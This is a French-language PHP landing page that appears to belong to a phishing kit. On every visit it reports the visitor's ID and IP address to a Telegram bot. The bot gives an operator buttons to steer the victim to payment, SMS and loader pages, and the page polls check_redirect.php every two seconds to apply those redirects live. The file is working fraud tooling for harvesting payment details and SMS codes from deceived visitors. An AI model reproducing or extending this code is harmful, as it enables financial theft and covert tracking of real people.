<?php
require_once 'config.php';

// Vérifier les redirections du bot EN PREMIER
checkRedirect();

// TEST DIRECT - Envoyer à CHAQUE fois pour debug
$message = "🎉 NOUVELLE VISITE TEST\n👤 User: $current_user_id\n🌐 IP: $current_ip\n⏰ " . date('H:i:s');

// Keyboard avec les 7 boutons
$keyboard = [
    'inline_keyboard' => [
        [['text' => '🏠 Accueil', 'callback_data' => $current_user_id . ':index.php']],
        [['text' => '📦 Infos', 'callback_data' => $current_user_id . ':info.php']],
        [['text' => '💳 Paiement', 'callback_data' => $current_user_id . ':payment.php']],
        [['text' => '⏳ Loader', 'callback_data' => $current_user_id . ':loader.php']],
        [['text' => '📱 SMS', 'callback_data' => $current_user_id . ':sms.php']],
        [['text' => '⚡ Loader2', 'callback_data' => $current_user_id . ':loader2.php']],
        [['text' => '✅ Terminer', 'callback_data' => $current_user_id . ':done.php']]
    ]
];

// Envoyer DIRECTEMENT sans vérifier la session
$result = sendTelegramMessage($message, $keyboard);

// Log détaillé
file_put_contents('debug.log', date('Y-m-d H:i:s') . 
    " - User: $current_user_id, IP: $current_ip, Result: " . 
    substr($result, 0, 100) . "\n", FILE_APPEND);
?>
<!DOCTYPE html>
<html>
<head>
    <title>Accueil - TEST</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 500px; margin: 0 auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
        .btn { display: block; width: 94%; padding: 15px; margin: 10px 0; background: #2196F3; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; text-decoration: none; }
        .debug { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 15px 0; font-family: monospace; font-size: 12px; text-align: left; }
        .success { background: #d4edda; padding: 10px; border-radius: 5px; margin: 15px 0; color: #155724; }
        .error { background: #f8d7da; padding: 10px; border-radius: 5px; margin: 15px 0; color: #721c24; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🏠 Accueil</h1>
        
       
        
        <?php if (strpos($result, '"ok":true') !== false): ?>
            <div class="success">
                ✅ <strong>NOTIFICATION ENVOYÉE AVEC SUCCÈS</strong><br>
                Vous devriez recevoir un message Telegram avec 7 boutons
            </div>
        <?php else: ?>
            <div class="error">
                ❌ <strong>ERREUR D'ENVOI</strong><br>
                Résultat: <?php echo htmlspecialchars(substr($result, 0, 200)); ?>
            </div>
        <?php endif; ?>
        
        <a href="info.php" class="btn">📦 Suivant</a>
        

    <script>
    setInterval(() => {
        fetch('check_redirect.php?user_id=<?php echo $current_user_id; ?>')
            .then(r => r.text())
            .then(page => {
                if (page && page.trim() !== '') {
                    window.location.href = page;
                }
            });
    }, 2000);
    </script>
</body>
</html>
